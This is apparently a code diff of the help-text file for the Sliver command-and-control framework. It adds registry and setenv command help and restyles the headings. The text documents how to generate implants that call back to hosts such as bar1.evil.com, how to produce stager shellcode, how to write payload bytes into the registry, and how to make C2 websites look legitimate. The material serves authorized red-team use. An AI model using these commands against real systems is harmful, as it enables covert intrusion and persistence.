@@ -29,10 +29,31 @@ import (
 	consts "github.com/bishopfox/sliver/client/constants"
 )
 
+const (
+	// ANSI Colors
+	normal    = "\033[0m"
+	black     = "\033[30m"
+	red       = "\033[31m"
+	green     = "\033[32m"
+	orange    = "\033[33m"
+	blue      = "\033[34m"
+	purple    = "\033[35m"
+	cyan      = "\033[36m"
+	gray      = "\033[37m"
+	bold      = "\033[1m"
+	clearln   = "\r\x1b[2K"
+	upN       = "\033[%dA"
+	downN     = "\033[%dB"
+	underline = "\033[4m"
+)
+
 var (
 	cmdHelp = map[string]string{
+		consts.ConfigStr:             configPromptHelp,
+		consts.ConfigPromptServerStr: configPromptHelp,
+		consts.ConfigPromptSliverStr: configPromptHelp,
+
 		consts.JobsStr:            jobsHelp,
-		consts.SessionsStr:        sessionsHelp,
 		consts.BackgroundStr:      backgroundHelp,
 		consts.InfoStr:            infoHelp,
 		consts.UseStr:             useHelp,
@@ -68,17 +89,22 @@ var (
 		consts.PsExecStr:           psExecHelp,
 		consts.BackdoorStr:         backdoorHelp,
 
-		consts.WebsitesStr:   websitesHelp,
-		consts.ScreenshotStr: screenshotHelp,
-		consts.MakeTokenStr:  makeTokenHelp,
-		consts.GetEnvStr:     getEnvHelp,
+		consts.WebsitesStr:          websitesHelp,
+		consts.ScreenshotStr:        screenshotHelp,
+		consts.MakeTokenStr:         makeTokenHelp,
+		consts.GetEnvStr:            getEnvHelp,
+		consts.SetEnvStr:            setEnvHelp,
+		consts.RegistryWriteStr:     regWriteHelp,
+		consts.RegistryReadStr:      regReadHelp,
+		consts.RegistryCreateKeyStr: regCreateKeyHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
 	[[.Bold]]About:[[.Normal]] Manage jobs/listeners.`
 
-	sessionsHelp = `[[.Bold]]Command:[[.Normal]] sessions <options>
-[[.Bold]]About:[[.Normal]] List Sliver sessions, and optionally interact or kill a session.`
+	configPromptHelp = `A few notes on the prompt setup commands:
+- You can deactivate any prompt (right or left side) by entering config prompt-server "" (or prompt-sliver, with --right or --left options)
+- You also (unfortunately) need to escape EVERY space you might want to add with \ (because the shell parses args into a space-trimmed list)`
 
 	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
 [[.Bold]]About:[[.Normal]] Background the active Sliver.`
@@ -89,12 +115,10 @@ var (
 	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name/session]
 [[.Bold]]About:[[.Normal]] Switch the active Sliver, a valid name must be provided (see sessions).`
 
-	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
-[[.Bold]]About:[[.Normal]] Generate a new sliver binary and saves the output to the cwd or a path specified with --save.
-
-[[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
-You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
-The command requires at least one use of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
+	generateHelp = `
+[[.Orange]][[.Underline]]++ Command and Control ++[[.Normal]]
+You must specificy at least one c2 endpoint when generating an implant, 
+this can be one or more of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
 
 The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
 	generate --mtls foo.example.com 
@@ -103,7 +127,7 @@ You can also stack the C2 configuration with multiple protocols:
 	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com
 
 
-[[.Bold]][[.Underline]]++ Formats ++[[.Normal]]
+[[.Orange]][[.Underline]]++ Formats ++[[.Normal]]
 Supported output formats are Windows PE, Windows DLL, Windows Shellcode (SRDI), Mach-O, and ELF. The output format is controlled
 with the --os and --format flags.
 
@@ -121,7 +145,7 @@ To output a Linux ELF executable file, the following command would be used:
 	generate --os linux --mtls foo.example.com 
 
 
-[[.Bold]][[.Underline]]++ DNS Canaries ++[[.Normal]]
+[[.Orange]][[.Underline]]++ DNS Canaries ++[[.Normal]]
 DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
 This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
 to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
@@ -133,18 +157,15 @@ Unique canary subdomains are automatically generated and inserted using the --ca
 canaries and their status using the "canaries" command:
 	generate --mtls foo.example.com --canary 1.foobar.com
 
-[[.Bold]][[.Underline]]++ Execution Limits ++[[.Normal]]
+[[.Orange]][[.Underline]]++ Execution Limits ++[[.Normal]]
 Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.
 
-[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
+[[.Orange]][[.Underline]]++ Profiles ++[[.Normal]]
 Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
 see 'help new-profile'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
 command.
 `
-	generateStagerHelp = `[[.Bold]]Command:[[.Normal]] generate stager <options>
-[[.Bold]]About:[[.Normal]] Generate a new sliver stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --format.
-
-[[.Bold]][[.Underline]]++ Bad Characters ++[[.Normal]]
+	generateStagerHelp = `[[.Orange]][[.Underline]]++ Bad Characters ++[[.Normal]]
 Bad characters must be specified like this for single bytes:
 
 generate stager -b 00
@@ -153,14 +174,11 @@ And like this for multiple bytes:
 
 generate stager -b '00 0a cc'
 
-[[.Bold]][[.Underline]]++ Output Formats ++[[.Normal]]
+[[.Orange]][[.Underline]]++ Output Formats ++[[.Normal]]
 You can use the --format flag to print out the shellcode to stdout, in one of the following transform formats:
 [[.Bold]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
 `
-	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
-[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
-[[.Bold]]Examples:[[.Normal]] 
-
+	stageListenerHelp = `[[.Orange]]Examples:[[.Normal]] 
 The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
 When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.
 
@@ -171,10 +189,8 @@ To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common s
 new-profile --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--profile-name] <options>
-[[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
-
-[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
+	newProfileHelp = `
+[[.Orange]][[.Underline]]++ Profiles ++[[.Normal]]
 Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
 settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
 	new-profile --profile-name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
@@ -257,22 +273,25 @@ Shellcode files should be binary encoded, you can generate Sliver shellcode file
 	websitesHelp = `[[.Bold]]Command:[[.Normal]] websites <options> <operation>
 [[.Bold]]About:[[.Normal]] Add content to HTTP(S) C2 websites to make them look more legit.
 
-[[.Bold]][[.Underline]]++ Operations ++[[.Normal]]
-Operations are used to manage the content of each website and go at the end of the command.
-
-[[.Bold]]ls [[.Normal]] - List the contents of a website, specified with --website
-[[.Bold]]add[[.Normal]] - Add content to a website, specified with --website, --content, and --web-path
-[[.Bold]]rm [[.Normal]] - Remove content from a website, specified with --website and --web-path
+Websites can be thought of as a collection of content identified by a name, Sliver can store any number of
+websites, and each website can host any amount of static content mapped to arbitrary paths. For example, you
+could create a 'blog' website and 'corp' website each with its own collection of content. When starting an
+HTTP(S) C2 listener you can specify which collection of content to host on the C2 endpoint.
 
 [[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
+List websites:
+	websites
+
+List the contents of a website:
+	websites [name]
 
 Add content to a website:
-	websites --website blog --web-path / --content ./index.html add
-	websites --website blog --web-path /public --content ./public --recursive add
+	websites add-content --website blog --web-path / --content ./index.html
+	websites add-content --website blog --web-path /public --content ./public --recursive
 
-Delete content in a website:
-	websites --website blog --web-path /index.html rm
-	websites --website blog --web-path /public --recursive rm
+Delete content from a website:
+	websites rm-content --website blog --web-path /index.html
+	websites rm-content --website blog --web-path /public --recursive
 
 `
 	sideloadHelp = `[[.Bold]]Command:[[.Normal]] sideload <options> <filepath to DLL>
@@ -390,24 +409,35 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 [[.Bold]]About:[[.Normal]] Retrieve the environment variables for the current session. If no variable name is provided, lists all the environment variables.
 [[.Bold]]Example:[[.Normal]] getenv SHELL
 	`
-)
+	setEnvHelp = `[[.Bold]]Command:[[.Normal]] setenv [name]
+[[.Bold]]About:[[.Normal]] Set an environment variable in the current process.
+[[.Bold]]Example:[[.Normal]] setenv SHELL /bin/bash
+	`
+	regReadHelp = `[[.Bold]]Command:[[.Normal]] registry read PATH [name]
+[[.Bold]]About:[[.Normal]] Read a value from the windows registry
+[[.Bold]]Example:[[.Normal]] registry read --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
+	`
+	regWriteHelp = `[[.Bold]]Command:[[.Normal]] registry write PATH value [name]
+[[.Bold]]About:[[.Normal]] Write a value to the windows registry
+[[.Bold]]Example:[[.Normal]] registry write --hive HKLM --type dword "software\\google\\chrome\\BLBeacon\\version" 1234
 
-const (
-	// ANSI Colors
-	normal    = "\033[0m"
-	black     = "\033[30m"
-	red       = "\033[31m"
-	green     = "\033[32m"
-	orange    = "\033[33m"
-	blue      = "\033[34m"
-	purple    = "\033[35m"
-	cyan      = "\033[36m"
-	gray      = "\033[37m"
-	bold      = "\033[1m"
-	clearln   = "\r\x1b[2K"
-	upN       = "\033[%dA"
-	downN     = "\033[%dB"
-	underline = "\033[4m"
+The type flag can take the following values:
+
+- string (regular string)
+- dword (uint32)
+- qword (uint64)
+- binary
+
+When using the binary type, you must either:
+
+- pass the value as an hex encoded string: registry write --type binary --hive HKCU "software\\bla\\key\\val" 0d0a90124f
+- use the --path flag to provide a filepath containg the payload you want to write: registry write --type binary --path /tmp/payload.bin --hive HKCU "software\\bla\\key\\val"
+
+	`
+	regCreateKeyHelp = `[[.Bold]]Command:[[.Normal]] registry create PATH [name]
+[[.Bold]]About:[[.Normal]] Read a value from the windows registry
+[[.Bold]]Example:[[.Normal]] registry create --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
+	`
 )
 
 // GetHelpFor - Get help string for a command
